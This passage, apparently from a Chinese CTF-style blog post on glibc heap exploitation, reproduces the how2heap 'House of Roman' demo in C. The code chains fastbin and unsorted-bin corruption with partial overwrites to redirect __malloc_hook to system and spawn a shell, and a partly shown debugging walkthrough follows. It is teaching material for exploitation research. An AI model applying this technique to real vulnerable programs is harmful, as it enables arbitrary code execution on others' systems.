like the following: </span></span><br><span class="line"><span class="comment">	ptr_to_chunk -&gt; ptr_to_libc. Then, we alter the ptr_to_libc</span></span><br><span class="line"><span class="comment">	 (with a relative overwrite) to point to __malloc_hook. </span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	The next step is to run an unsorted bin attack on the __malloc_hook </span></span><br><span class="line"><span class="comment">	(which is now controllable from the previous attack).  Again, we run </span></span><br><span class="line"><span class="comment">	the unsorted_bin attack by altering the chunk-&gt;bk with a relative overwrite. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Finally, after launching the unsorted_bin attack to put a libc value </span></span><br><span class="line"><span class="comment">	inside of __malloc_hook, we use another relative overwrite on the </span></span><br><span class="line"><span class="comment">	value of __malloc_hook to point to a one_gadget, system or some other function.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the next time we run malloc we pop a shell! :) </span></span><br><span class="line"><span class="comment">	However, this does come at a cost: 12 bits of randomness must be </span></span><br><span class="line"><span class="comment">	brute forced (0.02% chance) of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The original write up for the *House of Roman* can be found at</span></span><br><span class="line"><span class="comment">	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This technique requires the ability to edit fastbin and unsorted bin </span></span><br><span class="line"><span class="comment">	pointers via UAF or overflow of some kind. Additionally, good control </span></span><br><span class="line"><span class="comment">	over the allocations sizes and freeing is required for this technique.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* introduction = <span class="string">&quot;\nWelcome to the House of Roman\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;There are three stages to the attack: \n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;All of the stuff mentioned above is done using two main concepts:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;relative overwrites and heap feng shui.\n\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;However, this technique comes at a cost:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits of entropy need to be brute forced.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;</span></span><br><span class="line">			     <span class="string">&quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(introduction);	</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*	</span></span><br><span class="line"><span class="comment">	Part 1: Fastbin Chunk points to __malloc_hook</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the main_arena in a fastbin chunk ordering is the first step.</span></span><br><span class="line"><span class="comment">	This requires a ton of heap feng shui in order to line this up properly. </span></span><br><span class="line"><span class="comment">	However, at a glance, it looks like the following:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	First, we need to get a chunk that is in the fastbin with a pointer to</span></span><br><span class="line"><span class="comment">	a heap chunk in the fd. </span></span><br><span class="line"><span class="comment">	Second, we point this chunk to a pointer to LibC (in another heap chunk). </span></span><br><span class="line"><span class="comment">	All of the setup below is in order to get the configuration mentioned </span></span><br><span class="line"><span class="comment">	above setup to perform the relative overwrites. &quot;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Getting the pointer to libC can be done in two ways: </span></span><br><span class="line"><span class="comment">			- A split from a chunk in the small/large/unsorted_bins </span></span><br><span class="line"><span class="comment">				gets allocated to a size of 0x70. </span></span><br><span class="line"><span class="comment">			- Overwrite the size of a small/large chunk used previously to 0x71.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For the sake of example, this uses the first option because it </span></span><br><span class="line"><span class="comment">	requires less vulnerabilities.	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	</span></span><br><span class="line">	<span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line">	<span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line">	<span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Offset 0x100</span></span><br><span class="line">	<span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Offset 0x190</span></span><br><span class="line">	<span class="comment">// This ptr will be used for a relative offset on the &#x27;main_arena_use&#x27; chunk</span></span><br><span class="line">	<span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line">	<span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line">	<span class="built_in">free</span>(main_arena_use);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">	We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">	contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">	chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment">	 a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line">	<span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line">	<span class="comment">//Freeing this chunk puts a chunk in the fd slot of &#x27;fastbin_victim&#x27; to be used later. </span></span><br><span class="line">	<span class="built_in">free</span>(relative_offset_heap);	</span><br><span class="line"></span><br><span class="line">    	<span class="comment">/* </span></span><br><span class="line"><span class="comment">    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">	points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     	*/</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we start doing the relative overwrites, since that we have </span></span><br><span class="line"><span class="comment">	the pointers in their proper locations. The layout is very important to </span></span><br><span class="line"><span class="comment">	understand for this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Current heap layout: </span></span><br><span class="line"><span class="comment">	0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">	0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">	0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">	0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">	0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	bin layout: </span></span><br><span class="line"><span class="comment">			fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">			unsorted: leftover_main</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Now, the relative overwriting begins:</span></span><br><span class="line"><span class="comment">	Recall that fastbin_victim points to relative_offset_heap </span></span><br><span class="line"><span class="comment">	(which is in the 0x100-0x200 offset range). The fastbin uses a singly </span></span><br><span class="line"><span class="comment">	linked list, with the next chunk in the &#x27;fd&#x27; slot.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	By *partially* editing the fastbin_victim&#x27;s last byte (from 0x90 </span></span><br><span class="line"><span class="comment">	to 0x00) we have moved the fd pointer of fastbin_victim to </span></span><br><span class="line"><span class="comment">	fake_libc_chunk (at offset 0x100).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. </span></span><br><span class="line"><span class="comment">	Because of this, it has a fd pointer that points to main_arena + 0x68. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, the fastbin looks like the following: </span></span><br><span class="line"><span class="comment">	fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The relative overwrites (mentioned above) will be demonstrates step by step below.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">	fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Now, we have a fastbin that looks like the following: </span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	We want the fd ptr in fake_libc_chunk to point to something useful. </span></span><br><span class="line"><span class="comment">	So, let&#x27;s edit this to point to the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	This way, we can get control of a function ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	To do this, we need a valid malloc size. Within the __memalign_hook </span></span><br><span class="line"><span class="comment">	is usually an address that usually starts with 0x7f. </span></span><br><span class="line"><span class="comment">	Because __memalign_hook value is right before this are all 0s, </span></span><br><span class="line"><span class="comment">	we could use a misaligned chunk to get this to work as a valid size in </span></span><br><span class="line"><span class="comment">	the 0x70 fastbin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This is where the first 4 bits of randomness come into play. </span></span><br><span class="line"><span class="comment">	The first 12 bits of the LibC address are deterministic for the address. </span></span><br><span class="line"><span class="comment">	However, the next 4 (for a total of 2 bytes) are not. </span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	So, we have to brute force 2^4 different possibilities (16) </span></span><br><span class="line"><span class="comment">	in order to get this in the correct location. This &#x27;location&#x27; </span></span><br><span class="line"><span class="comment">	is different for each version of GLibC (should be noted).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After doing this relative overwrite, the fastbin looks like the following:</span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Relatively overwrite the main_arena pointer to point to a valid </span></span><br><span class="line"><span class="comment">	chunk close to __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// <span class="doctag">NOTE:</span> In order to make this exploit consistent </span></span><br><span class="line"><span class="comment">	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In the actual attack, this values would need to be specific </span></span><br><span class="line"><span class="comment">	to a version and some of the bits would have to be brute forced </span></span><br><span class="line"><span class="comment">	(depending on the bits).</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The relative overwrite</span></span><br><span class="line">	<span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	<span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">	fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">	fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line">	<span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line">	<span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line">	<span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line">	<span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Part 2: Unsorted_bin attack </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we have control over the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	However, we do not know the address of LibC still. So, we cannot </span></span><br><span class="line"><span class="comment">	do much with this attack. In order to pop a shell, we need </span></span><br><span class="line"><span class="comment">	to get an address at the location of the __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We will use the unsorted_bin attack in order to change the value </span></span><br><span class="line"><span class="comment">	of the __malloc_hook with the address of main_arena + 0x68. </span></span><br><span class="line"><span class="comment">	For more information on the unsorted_bin attack, review </span></span><br><span class="line"><span class="comment">	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For a brief overview, the unsorted_bin attack allows us to write</span></span><br><span class="line"><span class="comment">	main_arena + 0x68 to any location by altering the chunk-&gt;bk of</span></span><br><span class="line"><span class="comment">	an unsorted_bin chunk. We will choose to write this to the </span></span><br><span class="line"><span class="comment">	location of __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After we overwrite __malloc_hook with the main_arena, we will </span></span><br><span class="line"><span class="comment">	edit the pointer (with a relative overwrite) to point to a </span></span><br><span class="line"><span class="comment">	one_gadget for immediate code execution.</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	Again, this relative overwrite works well but requires an additional </span></span><br><span class="line"><span class="comment">	1 byte (8 bits) of brute force.</span></span><br><span class="line"><span class="comment">	This brings the chances of a successful attempt up to 12 bits of </span></span><br><span class="line"><span class="comment">	randomness. This has about a 1/4096 or a 0.0244% chance of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The steps for phase two of the attack are explained as we go below.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don&#x27;t want to consolidate</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put chunk into unsorted_bin\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment">	 However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">	byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line">	<span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line">	<span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;</span>);</span><br><span class="line">	unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. 	</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">	unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Trigger the unsorted bin attack.</span></span><br><span class="line"><span class="comment">	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	A few things do happen though: </span></span><br><span class="line"><span class="comment">		- This makes the unsorted bin (hence, small and large too) </span></span><br><span class="line"><span class="comment">		   unusable. So, only allocations previously in the fastbin can only be used now.</span></span><br><span class="line"><span class="comment">		- If the same size chunk (the unsorted_bin attack chunk) </span></span><br><span class="line"><span class="comment">		   is NOT malloc&#x27;ed, the program will crash immediately afterwards. </span></span><br><span class="line"><span class="comment">		   So, the allocation request must be the same as the unsorted_bin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first point is totally fine (in this attack). But, in more complicated </span></span><br><span class="line"><span class="comment">	programming, this can be an issue.</span></span><br><span class="line"><span class="comment">	The second just requires us to do the same size allocaton as the current chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Trigger the unsorted_bin attack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">dlsym</span>(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The chunk itself is allocated 19 bytes away from __malloc_hook. </span></span><br><span class="line"><span class="comment">	So, we use a realtive overwrite (again) in order to partially overwrite </span></span><br><span class="line"><span class="comment">	the main_arena pointer (from unsorted_bin attack) to point to system.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In a real attack, the first 12 bits are static (per version). </span></span><br><span class="line"><span class="comment">	But, after that, the next 12 bits must be brute forced. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	/// <span class="doctag">NOTE:</span> For the sake of example, we will be setting these values, instead of brute forcing them. \\\</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 3: Set __malloc_hook to system/one_gadget\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n&quot;</span>);</span><br><span class="line">	malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">	malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span></span><br><span class="line">	<span class="comment">// In a real example, you would probably want to use a one_gadget. </span></span><br><span class="line">	<span class="comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span></span><br><span class="line">	<span class="comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span></span><br><span class="line">	<span class="comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-16"><a href="#调试-16" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204026160.png"
                      alt="image-20231013204026160"
                ></p>
<p>部署如上 <code>chunk</code>，从上到下分别为 <code>fastbin_victim</code> ，<code>obstruct</code>，<code>main_arena_use</code>，<code>relative_offset_heap</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204454716.png"
                      alt="image-20231013204454716"
                ></p>
<p>将 <code>main_arena_use</code> 放进 <code>unsorted_bin</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204656108.png"
                      alt="image-20231013204656108"
                ></p>
<p>再次申请 <code>0x70</code> 大小的 <code>chunk: fake_libc_chunk</code> ，拆分 <code>main_arena_use</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205315619.png"
                      alt="image-20231013205315619"
                ></p>
<p>利用 <code>fake_libc_chunk</code> 中保存的 <code>libc</code> 地址和固定偏移 <code>glibc_2.23为0xe8（每个版本基本都不同）</code> 计算出 <code>__malloc_hook</code> 地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205510025.png"
                      alt="image-20231013205510025"
                ></p>
<p>依次释放 <code>relative_offset_heap</code>，<code>fastbin_victim</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210049926.png"
                      alt="image-20231013210049926"
                ></p>
<p>将 <code>fastbin_victim</code> 的 <code>fd</code> 指针的末尾两位改为 <code>0</code>，那么将会把 <code>fake_libc_chunk</code> 链接进 <code>fastbinY[5](0x70)</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
